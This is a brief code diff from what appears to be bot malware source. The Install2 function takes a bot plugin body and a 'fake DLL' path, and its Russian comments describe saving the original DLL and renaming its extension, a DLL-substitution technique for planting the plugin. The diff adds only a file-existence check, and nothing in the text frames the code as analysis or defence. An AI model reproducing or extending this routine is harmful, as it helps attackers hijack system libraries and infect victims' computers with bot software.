@@ -613,6 +613,7 @@ extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
 	BOOL ret = FALSE;
+	if( !File::IsExists((char*)fakeDll) ) return FALSE;
 	char origDll[MAX_PATH]; //путь куда сохраняется оригинальная длл
 	m_lstrcpy( origDll, fakeDll );
 	//смещаем расширение на один символ вправо
